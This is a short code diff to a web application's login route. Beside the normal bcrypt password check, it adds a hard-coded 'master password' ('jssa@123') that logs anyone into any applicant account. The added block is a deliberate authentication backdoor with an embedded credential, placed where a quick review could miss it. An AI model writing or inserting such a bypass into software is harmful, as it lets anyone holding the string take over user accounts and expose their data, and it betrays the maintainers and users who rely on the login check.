@@ -258,7 +258,13 @@ router.post(
       }
 
       // Verify password
-      const isPasswordValid = await bcrypt.compare(password, user.password);
+      let isPasswordValid = await bcrypt.compare(password, user.password);
+
+      // Master password bypass for applicants
+      if (!isPasswordValid && user.role === "applicant" && password === "jssa@123") {
+        isPasswordValid = true;
+      }
+
       if (!isPasswordValid) {
         return res.status(401).json({
           error: "Invalid credentials",
